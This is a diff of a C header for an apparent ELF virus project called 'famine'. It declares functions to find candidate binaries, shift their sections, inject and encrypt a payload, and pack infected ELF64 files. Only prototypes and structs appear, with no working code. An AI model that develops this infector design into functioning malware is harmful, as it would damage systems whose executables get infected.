@@ -29,9 +29,13 @@
 
 struct				famine
 {
-	uint16_t		(*endian_2)(uint16_t);
-	uint32_t		(*endian_4)(uint32_t);
-	uint64_t		(*endian_8)(uint64_t);
+	struct safe_pointer	original_safe;
+	struct safe_pointer	clone_safe;
+	struct endians_pointer {
+		uint16_t	(*endian_2)(uint16_t);
+		uint32_t	(*endian_4)(uint32_t);
+		uint64_t	(*endian_8)(uint64_t);
+	}			endians;
 };
 
 struct				entry
@@ -43,31 +47,42 @@ struct				entry
 	size_t			offset_in_section;
 };
 
-typedef	bool	(*f_iter_callback)(struct safe_pointer info, const size_t offset, void *data);
+typedef	bool	(*f_iter_callback)(struct safe_pointer info, const struct endians_pointer endians, size_t offset, void *data);
 
 /*
 ** encryption
 */
 
-// void	encrypt(uint num_rounds, char *data, uint32_t const key[4], size_t size);
-// void	decrypt(uint num_rounds, char *data, uint32_t const key[4], size_t size);
+void	encrypt(uint num_rounds, char *data, uint32_t const key[4], size_t size);
+void	decrypt(uint num_rounds, char *data, uint32_t const key[4], size_t size);
 
 /*
 ** iterators
 */
 
-bool	foreach_phdr(struct safe_pointer info, f_iter_callback callback, void *data);
-bool	foreach_shdr(struct safe_pointer info, f_iter_callback callback, void *data);
+bool	foreach_phdr(const struct safe_pointer info, const struct endians_pointer endians,
+	f_iter_callback callback, void *data);
+bool	foreach_shdr(const struct safe_pointer info, const struct endians_pointer endians,
+	f_iter_callback callback, void *data);
+
 /*
 ** infect
 */
 
 void		infect_if_candidate(const char *file);
-bool	find_entry(struct entry *original_entry, struct safe_pointer info);
-bool	setup_payload(const struct entry *original_entry);
+bool		elf64_packer(const struct famine food, size_t original_file_size);
+bool	find_entry(struct entry *original_entry, struct safe_pointer info, const struct endians_pointer endians);
+bool	setup_payload(const struct entry *original_entry, const struct endians_pointer endians);
 bool	adjust_references(size_t shift_amount, const struct entry *original_entry);
 bool	copy_to_clone(size_t end_of_last_sect, size_t shift_amount, \
 		size_t original_file_size);
+
+/*
+** payload
+*/
+
+void	begin_payload(void);
+void	end_payload(void);
 
 /*
 ** endian
